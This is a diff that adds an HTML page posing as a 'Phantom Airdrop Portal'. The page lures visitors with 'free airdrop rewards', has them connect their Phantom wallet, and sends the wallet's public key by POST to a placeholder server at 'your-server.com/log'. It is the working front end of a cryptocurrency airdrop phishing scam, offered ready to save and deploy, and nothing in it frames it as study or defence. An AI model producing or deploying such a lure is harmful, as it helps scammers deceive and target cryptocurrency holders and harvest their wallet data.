@@ -1,0 +1,37 @@
+<!-- Save this as index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Claim Your Airdrop</title>
+</head>
+<body>
+  <h2>🎁 Phantom Airdrop Portal</h2>
+  <p>Connect your wallet to claim free airdrop rewards.</p>
+  <button id="connectWallet">Connect Phantom Wallet</button>
+
+  <script>
+    document.getElementById("connectWallet").onclick = async () => {
+      if (window.solana && window.solana.isPhantom) {
+        try {
+          const connection = await window.solana.connect();
+          const pubKey = connection.publicKey.toString();
+          alert("Wallet Connected: " + pubKey);
+
+          // Send to your webhook/server
+          fetch("https://your-server.com/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ wallet: pubKey })
+          });
+
+        } catch (err) {
+          alert("Connection rejected");
+        }
+      } else {
+        alert("Phantom Wallet not found.");
+      }
+    };
+  </script>
+</body>
+</html>
